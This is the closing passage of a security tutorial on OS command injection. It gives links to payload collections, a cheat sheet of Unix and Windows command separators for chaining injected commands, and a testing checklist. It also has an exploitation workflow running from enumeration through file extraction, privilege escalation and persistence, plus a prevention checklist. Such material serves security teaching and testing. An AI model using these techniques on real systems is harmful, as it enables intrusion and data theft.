   - Industry consensus on critical weaknesses
   - OS command injection consistently ranks high
   - Mitigation strategies

### Community Resources

1. **PayloadsAllTheThings - Command Injection**
   - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
   - Comprehensive payload collection
   - Bypass techniques
   - Platform-specific payloads

2. **HackTricks - Command Injection**
   - https://book.hacktricks.xyz/pentesting-web/command-injection
   - Penetration testing techniques
   - Real-world scenarios
   - Tool usage examples

3. **PortSwigger Research Blog**
   - https://portswigger.net/research
   - Latest web security research
   - Novel exploitation techniques
   - Tool releases and updates

---

## Quick Reference

### Common Command Separators

```bash
# Unix/Linux
;    # Sequential execution
|    # Pipe to next command
||   # Logical OR
&&   # Logical AND
&    # Background execution
`    # Command substitution
$()  # Command substitution (modern)
\n   # Newline

# Windows
&    # Sequential execution
|    # Pipe to next command
||   # Logical OR
&&   # Logical AND
```

### Testing Checklist

- [ ] Test with time-based payloads (`sleep`, `ping`)
- [ ] Test with output-based payloads (`whoami`, `id`)
- [ ] Test with out-of-band payloads (DNS, HTTP)
- [ ] Test all parameters (GET, POST, headers, cookies)
- [ ] Test with different command separators
- [ ] Test with encoded payloads (URL, base64)
- [ ] Test with obfuscated payloads (wildcards, quotes)
- [ ] Verify exploitation with multiple techniques
- [ ] Document findings with screenshots
- [ ] Test remediation effectiveness

### Exploitation Workflow

1. **Detect**: Confirm vulnerability exists
2. **Enumerate**: Gather system information
3. **Extract**: Read sensitive files/data
4. **Escalate**: Attempt privilege escalation
5. **Persist**: Establish persistent access (if authorized)
6. **Document**: Record all findings and evidence
7. **Report**: Provide detailed remediation guidance

### Prevention Checklist

- [ ] Avoid OS commands entirely (use native APIs)
- [ ] Use parameterized command execution
- [ ] Implement strict input validation (allowlist)
- [ ] Apply principle of least privilege
- [ ] Enable security logging and monitoring
- [ ] Deploy Web Application Firewall (WAF)
- [ ] Conduct regular security testing
- [ ] Perform code reviews for dangerous functions
- [ ] Implement security headers
- [ ] Use container security best practices
- [ ] Keep dependencies updated
- [ ] Follow secure coding standards

---

## Conclusion

OS command injection remains one of the most critical web application vulnerabilities, consistently appearing in OWASP Top 10 and CISA's Known Exploited Vulnerabilities catalog. Despite being well-understood, it continues to affect major enterprise products and security appliances.

**Key takeaways:**

1. **Prevention is paramount**: The best defense is avoiding OS command execution entirely
2. **Defense in depth**: Combine multiple security layers (input validation, least privilege, monitoring)
3. **Regular testing**: Include command injection in all security testing phases
4. **Stay informed**: Monitor CVE databases for new vulnerabilities
5. **Responsible disclosure**: Report findings through proper channels

By mastering the techniques in this guide, security professionals can effectively identify, exploit (in authorized testing), and remediate OS command injection vulnerabilities across diverse environments.

**Remember**: Always obtain proper authorization before testing for command injection vulnerabilities. Unauthorized testing is illegal and unethical.

---

*Last updated: 2025*
*Based on PortSwigger Web Security Academy labs and current industry standards*
